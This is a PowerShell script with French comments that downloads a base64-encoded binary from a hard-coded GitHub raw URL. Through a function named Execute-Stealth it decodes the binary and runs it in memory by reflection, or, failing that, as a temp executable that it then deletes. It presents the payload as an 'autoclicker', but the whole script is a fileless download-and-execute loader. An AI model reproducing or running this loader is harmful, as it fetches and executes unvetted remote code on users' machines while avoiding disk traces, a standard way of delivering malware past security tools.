[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    # Tenter de charger comme assembly .NET (pour exe C#)
    try {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            Write-Host "Lancement de l'application..." -ForegroundColor Yellow
            
            # Lancer dans un thread STA pour la GUI
            $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{
                try {
                    # S'assurer que les styles visuels sont activés
                    [System.Windows.Forms.Application]::EnableVisualStyles()
                    [System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault($false)
                    
                    Write-Host "[Thread] Lancement du point d'entree..." -ForegroundColor Gray
                    
                    # Lancer l'application - cela devrait démarrer Application.Run() si c'est une app Windows Forms
                    $entryPoint.Invoke($null, @())
                    
                    Write-Host "[Thread] Point d'entree termine." -ForegroundColor Gray
                } catch {
                    Write-Host "[Thread] ERREUR: $($_.Exception.Message)" -ForegroundColor Red
                    Write-Host "[Thread] Type: $($_.Exception.GetType().FullName)" -ForegroundColor Red
                    if ($_.Exception.StackTrace) {
                        Write-Host "[Thread] StackTrace: $($_.Exception.StackTrace)" -ForegroundColor DarkRed
                    }
                    Write-Host "[Thread] L'application s'est probablement fermee immediatement." -ForegroundColor Yellow
                }
            })
            
            $thread.SetApartmentState([System.Threading.ApartmentState]::STA)
            $thread.IsBackground = $false
            $thread.Start()
            
            # Attendre un peu pour voir si l'application démarre
            Start-Sleep -Milliseconds 1000
            
            Write-Host "Application lancee!" -ForegroundColor Green
            Write-Host ""
            Write-Host "Vérification de l'état du thread..." -ForegroundColor Gray
            Write-Host "Thread actif: $($thread.IsAlive)" -ForegroundColor Gray
            Write-Host ""
            
            if ($thread.IsAlive) {
                Write-Host "✅ L'autoclicker devrait etre ouvert dans une fenetre separee." -ForegroundColor Cyan
                Write-Host ""
                Write-Host "Fermez cette fenetre PowerShell pour arreter l'application." -ForegroundColor Yellow
                Write-Host ""
                
                # Attendre que le thread se termine (PowerShell reste ouvert)
                while ($thread.IsAlive) {
                    Start-Sleep -Milliseconds 500
                }
                
                Write-Host ""
                Write-Host "Application arretee." -ForegroundColor Yellow
            } else {
                Write-Host ""
                Write-Host "❌ Le thread s'est arrete immediatement!" -ForegroundColor Red
                Write-Host "Cela signifie que l'application s'est fermee des le lancement." -ForegroundColor Yellow
                Write-Host ""
                Write-Host "Possible cause: Le binaire n'est pas un executable Windows Forms valide" -ForegroundColor Yellow
                Write-Host "ou il manque Application.Run() dans le code." -ForegroundColor Yellow
                Write-Host ""
                Read-Host "Appuyez sur Entree pour fermer"
            }
            return
        }
    } catch {
        # Ce n'est pas un exe .NET, c'est probablement un exe natif (C++)
        Write-Host "Fichier natif detecte, execution en processus separe..." -ForegroundColor Yellow
    }

    # Pour exe natif (C++), sauvegarder temporairement et exécuter
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "temp_" + [System.Guid]::NewGuid().ToString() + ".exe")
    try {
        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
        $process = Start-Process -FilePath $tempPath -NoNewWindow -PassThru
        Write-Host "✅ Application lancee!" -ForegroundColor Green
        Write-Host ""
        Write-Host "Fermez cette fenetre PowerShell pour arreter l'application." -ForegroundColor Yellow
        Write-Host ""
        $process.WaitForExit()
        Write-Host "Application arretee." -ForegroundColor Yellow
    } finally {
        # Nettoyer le fichier temporaire
        if (Test-Path $tempPath) {
            Start-Sleep -Milliseconds 100
            Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
        }
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/file.txt"

Execute-Stealth -url $url
